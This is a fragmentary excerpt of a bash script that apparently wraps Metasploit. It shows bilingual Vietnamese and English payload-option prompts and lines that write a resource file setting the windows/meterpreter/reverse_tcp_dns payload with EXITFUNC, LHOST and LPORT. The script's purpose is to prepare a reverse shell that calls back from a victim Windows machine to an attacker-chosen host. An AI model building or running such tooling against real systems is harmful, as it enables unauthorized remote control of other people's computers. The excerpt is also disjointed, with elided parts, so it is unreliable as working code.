...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_tcp_dns):
...
no="     no "
cat << !
Payload options (windows/meterpreter/reverse_tcp_dns):
...
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/reverse_tcp_dns" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	paylo="windows/meterpreter/reverse_tcp_dns"
	lhost=$lhost
	lport=$lport
}
